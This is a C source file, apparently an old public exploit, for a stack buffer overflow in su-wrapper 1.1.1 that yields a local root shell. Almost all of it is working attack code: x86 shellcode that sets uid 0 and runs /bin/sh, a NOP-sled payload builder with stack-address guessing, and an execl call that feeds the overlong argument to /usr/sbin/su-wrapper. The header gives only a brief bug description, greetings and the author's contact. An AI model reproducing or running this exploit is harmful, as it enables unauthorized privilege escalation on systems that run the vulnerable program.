/* - su-wrapper.c - */

/*************************************************************************/
/* /usr/sbin/su-wrapper(su-wrapper 1.1.1) local root exploit.            */
/*                                                                       */
/* Package Description:                                                  */
/* su-wrapper is an little util which lets special users execute         */ 
/* processes under another uid/gid.                                      */
/*                                                                       */
/* Vulnerability Description:                                            */
/* If a long line on the first argument is gived, the program sends      */
/* a SIGSEGV Signal.                                                     */
/*                                                                       */
/* Affected: All Systems who have su-wrapper installed :P                */
/*                                                                       */
/* I don't know if other versions are vulnerable too.                    */
/*                                                                       */
/* This bug was reported to Enrico Weigelt (weigelt@nibiru.thur.de)      */
/*                                                                       */
/* Greets: NOP, dr_fdisk^, yield, vlad, dead, fatal, kuk, neuro, alt3kx, */
/* etc                                                                   */
/*        dex: dexgod@softhome.net <> http://www.raza-mexicana.org -     */
/*************************************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BUFFERSIZE 1032
#define OFFSET 0
#define ALIGN 0

static char shellcode[]=
  "\x29\xc0"                             /* subl %eax, %eax          */
  "\xb0\x46"                             /* movb $70, %al            */
  "\x29\xdb"                             /* subl %ebx, %ebx          */
  "\xb3\x0c"                             /* movb $12, %bl            */
  "\x80\xeb\x0c"                         /* subb $12, %bl            */
  "\x89\xd9"                             /* movl %ebx, %ecx          */
  "\xcd\x80"                             /* int $0x80                */
  "\xeb\x18"                             /* jmp callz                */
  "\x5e"                                 /* popl %esi                */
  "\x29\xc0"                             /* subl %eax, %eax          */
  "\x88\x46\x07"                         /* movb %al, 0x07(%esi)     */
  "\x89\x46\x0c"                         /* movl %eax, 0x0c(%esi)    */
  "\x89\x76\x08"                         /* movl %esi, 0x08(%esi)    */
  "\xb0\x0b"                             /* movb $0x0b, %al          */
  "\x87\xf3"                             /* xchgl %esi, %ebx         */
  "\x8d\x4b\x08"                         /* leal 0x08(%ebx), %ecx    */
  "\x8d\x53\x0c"                         /* leal 0x0c(%ebx), %edx    */
  "\xcd\x80"                             /* int $0x80                */
  "\xe8\xe3\xff\xff\xff"                 /* call start               */
  "\x2f\x62\x69\x6e\x2f\x73\x68";

unsigned long get_sp(void) {
 __asm__("movl %esp, %eax");
}

void main(int argc, char **argv) {

 int i;

 unsigned long addr;

 char *buffer;

 int buffersize = BUFFERSIZE;
 int offset = OFFSET;
 int align = ALIGN;

 if(argc > 1) offset = atoi(argv[1]);

 if(argc > 2) align = atoi(argv[2]);

 if(argc > 3) buffersize = atoi(argv[3]);

 buffer = (char *)malloc(buffersize +8);

 addr = get_sp() - offset;

 for(i = 0; i < buffersize; i+=4) {
  *(long *)&buffer[i] = 0x90909090;
 }

 *(long *)&buffer[buffersize - 4] = addr;

 *(long *)&buffer[buffersize - 8] = addr;

 memcpy(buffer + buffersize - 8 - strlen(shellcode) - align, shellcode, strlen(shellcode));

 printf("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n");
 
 printf("[x] su-wrapper 1.1.1 local root exploit\n");
 printf("[x] dex: - dexgod@softhome.net <> http://www.raza-mexicana.org - \n");

 printf("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n\n");

 printf("[x] Address = 0x%x, Align = %d, Offset = %d\n", addr, align, offset);

 printf("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n\n");

 printf("[x] Exploiting...\n");

 if ((execl("/usr/sbin/su-wrapper", "su-wrapper", buffer, NULL)) != 0) {
  printf("Could not start su-wrapper, /usr/sbin/su-wrapper exists?\n");
 }

}
